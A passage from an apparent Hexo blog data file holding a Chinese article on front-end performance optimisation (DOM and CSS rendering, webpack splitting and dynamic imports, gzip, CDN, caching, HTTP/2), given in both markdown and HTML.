每个请求都需要携带数据，每个请求都需要占用带宽（合并请求，如多个图片合并成一张大图）。\n* 浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间。（懒加载，只在必要的时机加载）\n\n### 3.2 启用 gzip 压缩\n许多网络服务器可以通过调用第三方模块或使用内置程序将文件压缩为 gzip 格式，然后再发送该压缩文件以供下载。这样可以在下载呈现网站所需的资源时节省一些时间。\n\n> Gzip通常将响应大小减少约 70％\n\n### 3.3 改善服务器响应时间\n将服务器响应时间控制在 200ms 以内。有很多潜在因素都可能会延缓服务器响应，例如应用逻辑缓慢、数据库查询缓慢、路由缓慢、框架、库、资源CPU不足或内存不足等。\n\n### 3.4 使用 CDN 加速\n可降低网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力\n\n### 3.5 合理的 HTTP 缓存策略\n尽可能利用缓存，对于文件名中有 hash 值时，设置强缓存，如设置 `cache-control: max-age=2592000` (1个月，或者半年、一年等)\n\n### 3.6 域名分片、域名收敛\n\n域名分片：把页面资源拆分成多个域名进行访问，从而提高页面加载速度。原因在于 Web 浏览器会限制每个域名的并发数量，如 6 个（浏览器有并发限制，是为了防止 DDOS攻击），当并行下载文件超过最大并发数就需要排队等待，如果有多个域名，则每个域名都可以发起 6 个 HTTP 请求，提高并发量。另外，不同的域名也可以防止 cookie 污染。（PS: 主要运用于 PC 端）\n\n域名收敛：将静态资源放在一个域名下不进行发散，主要是为了适应移动端的发展需求，通常 DNS 是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛。（PS: 主要运用于移动端）\n\n### 3.7 使用 HTTP2\n* 二进制分帧\n* 多路复用\n* 首部压缩\n* 流量控制\n* ...\n\n详细介绍可看下面的**相关链接**部分\n\n\n## 相关链接\n* [content-visibility](https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility)\n* [window.requestAnimationFrame](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame)\n* [高性能渲染十万条数据(虚拟列表)](https://juejin.cn/post/6844903982742110216)\n* [CDN原理简析](https://juejin.cn/post/6844903873518239752)\n* [一文读懂 HTTP/2 特性](https://zhuanlan.zhihu.com/p/26559480)\n","slug":"HTML/前端性能优化 - 通用篇","published":1,"updated":"2021-06-07T11:38:00.296Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjm7k700015g6r3o7r7lyu","content":"<h1 id=\"前端性能优化\"><a href=\"#前端性能优化\" class=\"headerlink\" title=\"前端性能优化\"></a>前端性能优化</h1><h2 id=\"一、代码层面\"><a href=\"#一、代码层面\" class=\"headerlink\" title=\"一、代码层面\"></a>一、代码层面</h2><h3 id=\"1-1-减少-DOM-元素\"><a href=\"#1-1-减少-DOM-元素\" class=\"headerlink\" title=\"1.1 减少 DOM 元素\"></a>1.1 减少 DOM 元素</h3><p>DOM 元素越多、越复杂，则 DOM 操作（即重绘、重排）会越慢</p>\n<p>优化方式：</p>\n<ul>\n<li>可以使用伪元素、阴影、CSS 实现的内容尽量不要使用 DOM 实现</li>\n<li>按需加载，减少不必要的渲染</li>\n<li>结构合理，语义化标签</li>\n</ul>\n<h3 id=\"1-2-降低-CSS-选择器的复杂性\"><a href=\"#1-2-降低-CSS-选择器的复杂性\" class=\"headerlink\" title=\"1.2 降低 CSS 选择器的复杂性\"></a>1.2 降低 CSS 选择器的复杂性</h3><p>CSS 选择器的匹配规则是是<em>从右往左</em>的，即先找到符合条件的元素，然后再匹配父元素进行过滤（why? 符合条件的元素远少于不符合条件的元素，可以节约性能）</p>\n<p>所以有如下注意事项：</p>\n<ul>\n<li>不给ID分类和Class分类添加标签名；（会增加一次过滤）</li>\n<li>用子代选择器代替后代选择器；（避免无效的遍历）</li>\n<li>用Class分类代替子代选择器；（避免多次遍历）</li>\n<li>特殊类别可使用属性选择器；（避免多次遍历）</li>\n<li>正确使用可继承的属性；（可从父元素传到子元素）</li>\n<li>尽量避免通配符；（首先会遍历所有的元素，然后再过滤）</li>\n</ul>\n<h3 id=\"1-2-尽可能使用-flex-布局\"><a href=\"#1-2-尽可能使用-flex-布局\" class=\"headerlink\" title=\"1.2 尽可能使用 flex 布局\"></a>1.2 尽可能使用 flex 布局</h3><p>尽量使用 flex 代替浮动、表格等布局，后者会更耗性能且不易维护</p>\n<h3 id=\"1-3-使用字体图标代替图片\"><a href=\"#1-3-使用字体图标代替图片\" class=\"headerlink\" title=\"1.3 使用字体图标代替图片\"></a>1.3 使用字体图标代替图片</h3><p>字体图标就是将图标制作成一个字体，使用时就跟字体一样，可以设置属性，例如 font-size、color 等，而且字体图标是矢量图，不会失真，生成的文件也较小。</p>\n<h3 id=\"1-4-合理使用-will-change\"><a href=\"#1-4-合理使用-will-change\" class=\"headerlink\" title=\"1.4 合理使用 will-change\"></a>1.4 合理使用 will-change</h3><p>告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作</p>\n<h3 id=\"1-5-使用-content-visibility\"><a href=\"#1-5-使用-content-visibility\" class=\"headerlink\" title=\"1.5 使用 content-visibility\"></a>1.5 使用 content-visibility</h3><p><code>content-visibility</code> 属性接受多个值，其中 <code>auto</code> 是可立即提高性能的属性。一个具有 <code>content-visibility: auto</code> 属性的元素可以获得布局、样式和绘制的限制（区域），如果元素不在屏幕上，这不会渲染其后代。浏览器在不考虑元素任何内容的情况下确定元素的大小，在此处则跳过大多数渲染。</p>\n<h3 id=\"1-6-使用-CSS3-GPU-加速\"><a href=\"#1-6-使用-CSS3-GPU-加速\" class=\"headerlink\" title=\"1.6 使用 CSS3 GPU 加速\"></a>1.6 使用 CSS3 GPU 加速</h3><blockquote>\n<p>在 GPU 渲染的过程中，一些元素会因为符合了某些规则，而被提升为独立的层（黄色边框部分），一旦独立出来，就不会影响其它 DOM 的布局，所以我们可以利用这些规则，将经常变换的 DOM 主动提升到独立的层，那么在浏览器的一帧运行中，就可以减少 Layout 和 Paint 的时间了</p>\n</blockquote>\n<p>CSS 中的以下几个属性能触发硬件加速：</p>\n<ul>\n<li>transform</li>\n<li>opacity</li>\n<li>filter</li>\n<li>will-change</li>\n</ul>\n<h3 id=\"1-7-避免过多的回流与重绘\"><a href=\"#1-7-避免过多的回流与重绘\" class=\"headerlink\" title=\"1.7 避免过多的回流与重绘\"></a>1.7 避免过多的回流与重绘</h3><ul>\n<li>重绘（reflow）：重新绘制（如改变某个元素的颜色、背景，并没有使布局改变）</li>\n<li>重排（repaint）：重新生成布局（如改变某个元素的位置，导致布局改变，同时触发 重排、重绘）</li>\n</ul>\n<p>相对于 <code>Object</code>、<code>Array</code> 操作，DOM 上的操作会慢上几个数量级，即使现代浏览器已经对 DOM 操作（重排、重绘）做了无数优化。所以大部分时候，Web 性能的瓶颈通常在渲染上。</p>\n<blockquote>\n<p>DOM 操作很慢，绝大部分时候是指 DOM 操作所产生的副作用慢（主要是导致了重排），在页面上的任何操作都是有代价的</p>\n</blockquote>\n<p>说明：</p>\n<ol>\n<li>样式表越简单，重排和重绘就越快；</li>\n<li>重排和重绘的 DOM 元素层级越高，成本就越高；</li>\n<li><code>&lt;table&gt;</code> 元素的重排和重绘成本高于 <code>&lt;div&gt;</code> 元素</li>\n</ol>\n<p>优化方式：</p>\n<ul>\n<li>批量读写：统一读取属性，然后统一修改 DOM ，减少渲染次数</li>\n<li>使用 DOM 片段 <code>document.createDocumentFragment()</code></li>\n<li>多次访问同一 DOM 应用局部变量缓存</li>\n<li>操作元素时先隐藏，修改完元素后再显示</li>\n<li>将元素的 <code>position</code> 属性为 <code>absolute</code> 或 <code>fixed</code> 的元素</li>\n<li>使用 <code>window.requestAnimationFrame()</code>、<code>window.requestIdleCallback()</code> 调节重新渲染</li>\n<li>使用虚拟 DOM 技术，如 <code>React</code>、<code>Vue</code></li>\n</ul>\n<h3 id=\"1-8-使用-preload、prefetch\"><a href=\"#1-8-使用-preload、prefetch\" class=\"headerlink\" title=\"1.8 使用 preload、prefetch\"></a>1.8 使用 preload、prefetch</h3><ul>\n<li><code>&lt;link rel=&quot;preload&quot;&gt;&lt;/link&gt;</code>用于本页面要用到的关键资源，包括关键js、字体、css文件。preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度</li>\n<li><code>&lt;link rel=&quot;prefetch&quot;&gt;&lt;/link&gt;</code>用于加速未来页面里的资源，被标记为 prefetch 的资源，将会被浏览器在空闲时间加载，下载顺序权重比较低</li>\n</ul>\n<h3 id=\"1-9-使用-requestAnimationFrame-优化动画\"><a href=\"#1-9-使用-requestAnimationFrame-优化动画\" class=\"headerlink\" title=\"1.9 使用 requestAnimationFrame 优化动画\"></a>1.9 使用 requestAnimationFrame 优化动画</h3><p>使用 <code>setTimeout</code> 或 <code>setInterval</code> 来实现动画的话，回调函数将在帧中的某个时点运行，可能刚好在末尾，可能经常丢失帧，导致卡顿，requestAnimationFrame 会在浏览器下一次重绘前执行，能使动画看上去更加流畅（PS: 当然最好的方式是使用 CSS3 动画）</p>\n<h3 id=\"1-10-使用虚拟列表\"><a href=\"#1-10-使用虚拟列表\" class=\"headerlink\" title=\"1.10 使用虚拟列表\"></a>1.10 使用虚拟列表</h3><p>虚拟列表其实是按需显示的一种实现，即只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染的技术，从而达到极高的渲染性能。详情请看文章末尾的相关链接。</p>\n<h3 id=\"1-11-防抖、节流\"><a href=\"#1-11-防抖、节流\" class=\"headerlink\" title=\"1.11 防抖、节流\"></a>1.11 防抖、节流</h3><p>用于 onresize、onkeydown 等频繁触发的事件中，可减少请求、DOM 操作等，改善用户体验</p>\n<ul>\n<li>防抖：在多次触发中(还没执行)，只执行最后一个触发。</li>\n<li>节流：在一段时间内，只能执行一次。</li>\n</ul>\n<h3 id=\"1-12-图片优化\"><a href=\"#1-12-图片优化\" class=\"headerlink\" title=\"1.12 图片优化\"></a>1.12 图片优化</h3><ul>\n<li>图片延迟加载：只加载可视区内的图片，根据 <code>getBoundingClientRect()</code> 来判断</li>\n<li>响应式图片：够根据屏幕大小自动加载合适的图片，可通过 <code>&lt;picture&gt;</code> 或 <code>@media</code> 来实现</li>\n<li>图片压缩：在可接受的范围内压缩图片，压缩后通常能减少 30% 左右的大小，且肉眼看上去无差异</li>\n<li>使用 webp 格式的图片：更优的图像数据压缩算法，相比于传统 JPEG、PNG 图片，Webp 可以让图片大小平均减少 70% 左右。</li>\n<li>合理使用图片、背景图：装饰性的图片应该使用 CSS 的 <code>background-image</code> 标签，而不是使用 <code>img</code> 标签<ul>\n<li><code>img</code> 标签 DOM 解析完后去加载图片，图片加载失败时会显示一个撕裂的小图标标记，<strong>兼顾 SEO 和标签语义化时应该使用 <img /></strong></li>\n<li><code>background-image</code> 内引用的图片会在该规则生效时，才会去下载该图片（有点类似于按需加载），图片加载失败时不会显示异常</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"1-13-使用骨架屏\"><a href=\"#1-13-使用骨架屏\" class=\"headerlink\" title=\"1.13 使用骨架屏\"></a>1.13 使用骨架屏</h3><p>提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈，主要用于提升用户体验。</p>\n<h3 id=\"1-14-预渲染、服务端渲染（SSR）\"><a href=\"#1-14-预渲染、服务端渲染（SSR）\" class=\"headerlink\" title=\"1.14 预渲染、服务端渲染（SSR）\"></a>1.14 预渲染、服务端渲染（SSR）</h3><ul>\n<li>有利于 SEO</li>\n<li>有利于首屏渲染，提升用户体验</li>\n</ul>\n<p>说明：请权衡利弊后，再酌情使用！！</p>\n<h2 id=\"二、webpack-相关\"><a href=\"#二、webpack-相关\" class=\"headerlink\" title=\"二、webpack 相关\"></a>二、webpack 相关</h2><h3 id=\"2-1-Tree-Sharking\"><a href=\"#2-1-Tree-Sharking\" class=\"headerlink\" title=\"2.1 Tree Sharking\"></a>2.1 Tree Sharking</h3><p>用于消除无用的 js 代码，ES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是 Tree Sharking 的基础</p>\n<h3 id=\"2-2-代码拆分\"><a href=\"#2-2-代码拆分\" class=\"headerlink\" title=\"2.2 代码拆分\"></a>2.2 代码拆分</h3><p>使用 webpack 提供的 <code>optimization.splitChunks</code> 属性，主要作用是提取公共代码，防止代码被重复打包，拆分过大的js文件，合并零散的js文件等。</p>\n<h3 id=\"2-3-使用外部扩展-externals\"><a href=\"#2-3-使用外部扩展-externals\" class=\"headerlink\" title=\"2.3 使用外部扩展 externals\"></a>2.3 使用外部扩展 externals</h3><p>防止将某些 <code>import</code> 的包打包到 bundle 中，而是在运行时再去从外部获取这些扩展依赖。通过这种方式引入的依赖库，不需要 webpack 处理，编译进文件中，在我们需要，使用它的时候可以通过CMD、AMD、或者 window 全局方式访问</p>\n<p>例如，可以通过 CDN 去引入 React <code>&lt;script crossorigin src=&quot;https://unpkg.com/react@17/umd/react.production.min.js&quot;&gt;&lt;/script&gt;</code></p>\n<h3 id=\"2-4-动态-import\"><a href=\"#2-4-动态-import\" class=\"headerlink\" title=\"2.4 动态 import()\"></a>2.4 动态 import()</h3><p>webpack 提供了动态加载的 <code>import()</code> 方法，可以实现按需加载我们的代码，并且使用了 promise 式的回调，获取加载的包。在代码中所有被 import() 的模块，都将打成一个单独的包，用于实现页面或组件的按需加载。</p>\n<h3 id=\"2-5-动态-polyfill\"><a href=\"#2-5-动态-polyfill\" class=\"headerlink\" title=\"2.5 动态 polyfill\"></a>2.5 动态 polyfill</h3><blockquote>\n<p>为了浏览器的兼容性，我们常常引入各种 polyfill，但是在构建时静态地引入 polyfill 存在一些问题，比如对于机型和浏览器版本比较新的用户来说，他们完全不需要 polyfill，引入 polyfill 对于这部分用户来说是多余的，从而造成体积变大和性能损失</p>\n</blockquote>\n<p>动态 polyfill 指的是根据不同的浏览器，动态载入需要的 polyfill。 Polyfill.io 通过尝试使用 polyfill 重新创建缺少的功能，可以更轻松地支持不同的浏览器，并且可以大幅度的减少构建体积。</p>\n<p>原理：根据你的浏览器 UA 头，判断你是否支持某些特性，从而返回给你一个合适的 polyfill。对于最新的 Chrome 浏览器来说，不需要任何 polyfill，所以返回的内容为空。如在 html 文件中引入 <code>&lt;script crossorigin=&quot;anonymous&quot; src=&quot;https://polyfill.io/v3/polyfill.js&quot;&gt;&lt;/script&gt;</code></p>\n<h2 id=\"三、HTTP-层面\"><a href=\"#三、HTTP-层面\" class=\"headerlink\" title=\"三、HTTP 层面\"></a>三、HTTP 层面</h2><h3 id=\"3-1-减少-HTTP-请求数\"><a href=\"#3-1-减少-HTTP-请求数\" class=\"headerlink\" title=\"3.1 减少 HTTP 请求数\"></a>3.1 减少 HTTP 请求数</h3><p>一个完整的 HTTP 请求需要经历 DNS 查找，TCP 握手，浏览器发出 HTTP 请求，服务器接收请求，服务器处理请求并发回响应，浏览器接收响应等过程，而如果文件较小，则真正下载数据的时间占比就越小，将多个小文件合并为一个大文件，从而减少 HTTP 请求次数，能提高此比例 </p>\n<ul>\n<li>每个请求都是有成本的，DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据复杂的过程。（使用缓存功能）</li>\n<li>每个请求都需要携带数据，每个请求都需要占用带宽（合并请求，如多个图片合并成一张大图）。</li>\n<li>浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间。（懒加载，只在必要的时机加载）</li>\n</ul>\n<h3 id=\"3-2-启用-gzip-压缩\"><a href=\"#3-2-启用-gzip-压缩\" class=\"headerlink\" title=\"3.2 启用 gzip 压缩\"></a>3.2 启用 gzip 压缩</h3><p>许多网络服务器可以通过调用第三方模块或使用内置程序将文件压缩为 gzip 格式，然后再发送该压缩文件以供下载。这样可以在下载呈现网站所需的资源时节省一些时间。</p>\n<blockquote>\n<p>Gzip通常将响应大小减少约 70％</p>\n</blockquote>\n<h3 id=\"3-3-改善服务器响应时间\"><a href=\"#3-3-改善服务器响应时间\" class=\"headerlink\" title=\"3.3 改善服务器响应时间\"></a>3.3 改善服务器响应时间</h3><p>将服务器响应时间控制在 200ms 以内。有很多潜在因素都可能会延缓服务器响应，例如应用逻辑缓慢、数据库查询缓慢、路由缓慢、框架、库、资源CPU不足或内存不足等。</p>\n<h3 id=\"3-4-使用-CDN-加速\"><a href=\"#3-4-使用-CDN-加速\" class=\"headerlink\" title=\"3.4 使用 CDN 加速\"></a>3.4 使用 CDN 加速</h3><p>可降低网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力</p>\n<h3 id=\"3-5-合理的-HTTP-缓存策略\"><a href=\"#3-5-合理的-HTTP-缓存策略\" class=\"headerlink\" title=\"3.5 合理的 HTTP 缓存策略\"></a>3.5 合理的 HTTP 缓存策略</h3><p>尽可能利用缓存，对于文件名中有 hash 值时，设置强缓存，如设置 <code>cache-control: max-age=2592000</code> (1个月，或者半年、一年等)</p>\n<h3 id=\"3-6-域名分片、域名收敛\"><a href=\"#3-6-域名分片、域名收敛\" class=\"headerlink\" title=\"3.6 域名分片、域名收敛\"></a>3.6 域名分片、域名收敛</h3><p>域名分片：把页面资源拆分成多个域名进行访问，从而提高页面加载速度。原因在于 Web 浏览器会限制每个域名的并发数量，如 6 个（浏览器有并发限制，是为了防止 DDOS攻击），当并行下载文件超过最大并发数就需要排队等待，如果有多个域名，则每个域名都可以发起 6 个 HTTP 请求，提高并发量。另外，不同的域名也可以防止 cookie 污染。（PS: 主要运用于 PC 端）</p>\n<p>域名收敛：将静态资源放在一个域名下不进行发散，主要是为了适应移动端的发展需求，通常 DNS 是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛。（PS: 主要运用于移动端）</p>\n<h3 id=\"3-7-使用-HTTP2\"><a href=\"#3-7-使用-HTTP2\" class=\"headerlink\" title=\"3.7 使用 HTTP2\"></a>3.7 使用 HTTP2</h3><ul>\n<li>二进制分帧</li>\n<li>多路复用</li>\n<li>首部压缩</li>\n<li>流量控制</li>\n<li>…</li>\n</ul>\n<p>详细介绍可看下面的<strong>相关链接</strong>部分</p>\n<h2 id=\"相关链接\"><a href=\"#相关链接\" class=\"headerlink\" title=\"相关链接\"></a>相关链接</h2><ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility\">content-visibility</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame\">window.requestAnimationFrame</a></li>\n<li><a href=\"https://juejin.cn/post/6844903982742110216\">高性能渲染十万条数据(虚拟列表)</a></li>\n<li><a href=\"https://juejin.cn/post/6844903873518239752\">CDN原理简析</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/26559480\">一文读懂 HTTP/2 特性</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前端性能优化\"><a href=\"#前端性能优化\" class=\"headerlink\" title=\"前端性能优化\"></a>前端性能优化</h1><h2 id=\"一、代码层面\"><a href=\"#一、代码层面\" class=\"headerlink\" title=\"一、代码层面\"></a>一、代码层面</h2><h3 id=\"1-1-减少-DOM-元素\"><a href=\"#1-1-减少-DOM-元素\" class=\"headerlink\" title=\"1.1 减少 DOM 元素\"></a>1.1 减少 DOM 元素</h3><p>DOM 元素越多、越复杂，则 DOM 操作（即重绘、重排）会越慢</p>\n<p>优化方式：</p>\n<ul>\n<li>可以使用伪元素、阴影、CSS 实现的内容尽量不要使用 DOM 实现</li>\n<li>按需加载，减少不必要的渲染</li>\n<li>结构合理，语义化标签</li>\n</ul>\n<h3 id=\"1-2-降低-CSS-选择器的复杂性\"><a href=\"#1-2-降低-CSS-选择器的复杂性\" class=\"headerlink\" title=\"1.2 降低 CSS 选择器的复杂性\"></a>1.2 降低 CSS 选择器的复杂性</h3><p>CSS 选择器的匹配规则是是<em>从右往左</em>的，即先找到符合条件的元素，然后再匹配父元素进行过滤（why? 符合条件的元素远少于不符合条件的元素，可以节约性能）</p>\n<p>所以有如下注意事项：</p>\n<ul>\n<li>不给ID分类和Class分类添加标签名；（会增加一次过滤）</li>\n<li>用子代选择器代替后代选择器；（避免无效的遍历）</li>\n<li>用Class分类代替子代选择器；（避免多次遍历）</li>\n<li>特殊类别可使用属性选择器；（避免多次遍历）</li>\n<li>正确使用可继承的属性；（可从父元素传到子元素）</li>\n<li>尽量避免通配符；（首先会遍历所有的元素，然后再过滤）</li>\n</ul>\n<h3 id=\"1-2-尽可能使用-flex-布局\"><a href=\"#1-2-尽可能使用-flex-布局\" class=\"headerlink\" title=\"1.2 尽可能使用 flex 布局\"></a>1.2 尽可能使用 flex 布局</h3><p>尽量使用 flex 代替浮动、表格等布局，后者会更耗性能且不易维护</p>\n<h3 id=\"1-3-使用字体图标代替图片\"><a href=\"#1-3-使用字体图标代替图片\" class=\"headerlink\" title=\"1.3 使用字体图标代替图片\"></a>1.3 使用字体图标代替图片</h3><p>字体图标就是将图标制作成一个字体，使用时就跟字体一样，可以设置属性，例如 font-size、color 等，而且字体图标是矢量图，不会失真，生成的文件也较小。</p>\n<h3 id=\"1-4-合理使用-will-change\"><a href=\"#1-4-合理使用-will-change\" class=\"headerlink\" title=\"1.4 合理使用 will-change\"></a>1.4 合理使用 will-change</h3><p>告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作</p>\n<h3 id=\"1-5-使用-content-visibility\"><a href=\"#1-5-使用-content-visibility\" class=\"headerlink\" title=\"1.5 使用 content-visibility\"></a>1.5 使用 content-visibility</h3><p><code>content-visibility</code> 属性接受多个值，其中 <code>auto</code> 是可立即提高性能的属性。一个具有 <code>content-visibility: auto</code> 属性的元素可以获得布局、样式和绘制的限制（区域），如果元素不在屏幕上，这不会渲染其后代。浏览器在不考虑元素任何内容的情况下确定元素的大小，在此处则跳过大多数渲染。</p>\n<h3 id=\"1-6-使用-CSS3-GPU-加速\"><a href=\"#1-6-使用-CSS3-GPU-加速\" class=\"headerlink\" title=\"1.6 使用 CSS3 GPU 加速\"></a>1.6 使用 CSS3 GPU 加速</h3><blockquote>\n<p>在 GPU 渲染的过程中，一些元素会因为符合了某些规则，而被提升为独立的层（黄色边框部分），一旦独立出来，就不会影响其它 DOM 的布局，所以我们可以利用这些规则，将经常变换的 DOM 主动提升到独立的层，那么在浏览器的一帧运行中，就可以减少 Layout 和 Paint 的时间了</p>\n</blockquote>\n<p>CSS 中的以下几个属性能触发硬件加速：</p>\n<ul>\n<li>transform</li>\n<li>opacity</li>\n<li>filter</li>\n<li>will-change</li>\n</ul>\n<h3 id=\"1-7-避免过多的回流与重绘\"><a href=\"#1-7-避免过多的回流与重绘\" class=\"headerlink\" title=\"1.7 避免过多的回流与重绘\"></a>1.7 避免过多的回流与重绘</h3><ul>\n<li>重绘（reflow）：重新绘制（如改变某个元素的颜色、背景，并没有使布局改变）</li>\n<li>重排（repaint）：重新生成布局（如改变某个元素的位置，导致布局改变，同时触发 重排、重绘）</li>\n</ul>\n<p>相对于 <code>Object</code>、<code>Array</code> 操作，DOM 上的操作会慢上几个数量级，即使现代浏览器已经对 DOM 操作（重排、重绘）做了无数优化。所以大部分时候，Web 性能的瓶颈通常在渲染上。</p>\n<blockquote>\n<p>DOM 操作很慢，绝大部分时候是指 DOM 操作所产生的副作用慢（主要是导致了重排），在页面上的任何操作都是有代价的</p>\n</blockquote>\n<p>说明：</p>\n<ol>\n<li>样式表越简单，重排和重绘就越快；</li>\n<li>重排和重绘的 DOM 元素层级越高，成本就越高；</li>\n<li><code>&lt;table&gt;</code> 元素的重排和重绘成本高于 <code>&lt;div&gt;</code> 元素</li>\n</ol>\n<p>优化方式：</p>\n<ul>\n<li>批量读写：统一读取属性，然后统一修改 DOM ，减少渲染次数</li>\n<li>使用 DOM 片段 <code>document.createDocumentFragment()</code></li>\n<li>多次访问同一 DOM 应用局部变量缓存</li>\n<li>操作元素时先隐藏，修改完元素后再显示</li>\n<li>将元素的 <code>position</code> 属性为 <code>absolute</code> 或 <code>fixed</code> 的元素</li>\n<li>使用 <code>window.requestAnimationFrame()</code>、<code>window.requestIdleCallback()</code> 调节重新渲染</li>\n<li>使用虚拟 DOM 技术，如 <code>React</code>、<code>Vue</code></li>\n</ul>\n<h3 id=\"1-8-使用-preload、prefetch\"><a href=\"#1-8-使用-preload、prefetch\" class=\"headerlink\" title=\"1.8 使用 preload、prefetch\"></a>1.8 使用 preload、prefetch</h3><ul>\n<li><code>&lt;link rel=&quot;preload&quot;&gt;&lt;/link&gt;</code>用于本页面要用到的关键资源，包括关键js、字体、css文件。preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度</li>\n<li><code>&lt;link rel=&quot;prefetch&quot;&gt;&lt;/link&gt;</code>用于加速未来页面里的资源，被标记为 prefetch 的资源，将会被浏览器在空闲时间加载，下载顺序权重比较低</li>\n</ul>\n<h3 id=\"1-9-使用-requestAnimationFrame-优化动画\"><a href=\"#1-9-使用-requestAnimationFrame-优化动画\" class=\"headerlink\" title=\"1.9 使用 requestAnimationFrame 优化动画\"></a>1.9 使用 requestAnimationFrame 优化动画</h3><p>使用 <code>setTimeout</code> 或 <code>setInterval</code> 来实现动画的话，回调函数将在帧中的某个时点运行，可能刚好在末尾，可能经常丢失帧，导致卡顿，requestAnimationFrame 会在浏览器下一次重绘前执行，能使动画看上去更加流畅（PS: 当然最好的方式是使用 CSS3 动画）</p>\n<h3 id=\"1-10-使用虚拟列表\"><a href=\"#1-10-使用虚拟列表\" class=\"headerlink\" title=\"1.10 使用虚拟列表\"></a>1.10 使用虚拟列表</h3><p>虚拟列表其实是按需显示的一种实现，即只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染的技术，从而达到极高的渲染性能。详情请看文章末尾的相关链接。</p>\n<h3 id=\"1-11-防抖、节流\"><a href=\"#1-11-防抖、节流\" class=\"headerlink\" title=\"1.11 防抖、节流\"></a>1.11 防抖、节流</h3><p>用于 onresize、onkeydown 等频繁触发的事件中，可减少请求、DOM 操作等，改善用户体验</p>\n<ul>\n<li>防抖：在多次触发中(还没执行)，只执行最后一个触发。</li>\n<li>节流：在一段时间内，只能执行一次。</li>\n</ul>\n<h3 id=\"1-12-图片优化\"><a href=\"#1-12-图片优化\" class=\"headerlink\" title=\"1.12 图片优化\"></a>1.12 图片优化</h3><ul>\n<li>图片延迟加载：只加载可视区内的图片，根据 <code>getBoundingClientRect()</code> 来判断</li>\n<li>响应式图片：够根据屏幕大小自动加载合适的图片，可通过 <code>&lt;picture&gt;</code> 或 <code>@media</code> 来实现</li>\n<li>图片压缩：在可接受的范围内压缩图片，压缩后通常能减少 30% 左右的大小，且肉眼看上去无差异</li>\n<li>使用 webp 格式的图片：更优的图像数据压缩算法，相比于传统 JPEG、PNG 图片，Webp 可以让图片大小平均减少 70% 左右。</li>\n<li>合理使用图片、背景图：装饰性的图片应该使用 CSS 的 <code>background-image</code> 标签，而不是使用 <code>img</code> 标签<ul>\n<li><code>img</code> 标签 DOM 解析完后去加载图片，图片加载失败时会显示一个撕裂的小图标标记，<strong>兼顾 SEO 和标签语义化时应该使用 <img /></strong></li>\n<li><code>background-image</code> 内引用的图片会在该规则生效时，才会去下载该图片（有点类似于按需加载），图片加载失败时不会显示异常</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"1-13-使用骨架屏\"><a href=\"#1-13-使用骨架屏\" class=\"headerlink\" title=\"1.13 使用骨架屏\"></a>1.13 使用骨架屏</h3><p>提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈，主要用于提升用户体验。</p>\n<h3 id=\"1-14-预渲染、服务端渲染（SSR）\"><a href=\"#1-14-预渲染、服务端渲染（SSR）\" class=\"headerlink\" title=\"1.14 预渲染、服务端渲染（SSR）\"></a>1.14 预渲染、服务端渲染（SSR）</h3><ul>\n<li>有利于 SEO</li>\n<li>有利于首屏渲染，提升用户体验</li>\n</ul>\n<p>说明：请权衡利弊后，再酌情使用！！</p>\n<h2 id=\"二、webpack-相关\"><a href=\"#二、webpack-相关\" class=\"headerlink\" title=\"二、webpack 相关\"></a>二、webpack 相关</h2><h3 id=\"2-1-Tree-Sharking\"><a href=\"#2-1-Tree-Sharking\" class=\"headerlink\" title=\"2.1 Tree Sharking\"></a>2.1 Tree Sharking</h3><p>用于消除无用的 js 代码，ES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是 Tree Sharking 的基础</p>\n<h3 id=\"2-2-代码拆分\"><a href=\"#2-2-代码拆分\" class=\"headerlink\" title=\"2.2 代码拆分\"></a>2.2 代码拆分</h3><p>使用 webpack 提供的 <code>optimization.splitChunks</code> 属性，主要作用是提取公共代码，防止代码被重复打包，拆分过大的js文件，合并零散的js文件等。</p>\n<h3 id=\"2-3-使用外部扩展-externals\"><a href=\"#2-3-使用外部扩展-externals\" class=\"headerlink\" title=\"2.3 使用外部扩展 externals\"></a>2.3 使用外部扩展 externals</h3><p>防止将某些 <code>import</code> 的包打包到 bundle 中，而是在运行时再去从外部获取这些扩展依赖。通过这种方式引入的依赖库，不需要 webpack 处理，编译进文件中，在我们需要，使用它的时候可以通过CMD、AMD、或者 window 全局方式访问</p>\n<p>例如，可以通过 CDN 去引入 React <code>&lt;script crossorigin src=&quot;https://unpkg.com/react@17/umd/react.production.min.js&quot;&gt;&lt;/script&gt;</code></p>\n<h3 id=\"2-4-动态-import\"><a href=\"#2-4-动态-import\" class=\"headerlink\" title=\"2.4 动态 import()\"></a>2.4 动态 import()</h3><p>webpack 提供了动态加载的 <code>import()</code> 方法，可以实现按需加载我们的代码，并且使用了 promise 式的回调，获取加载的包。在代码中所有被 import() 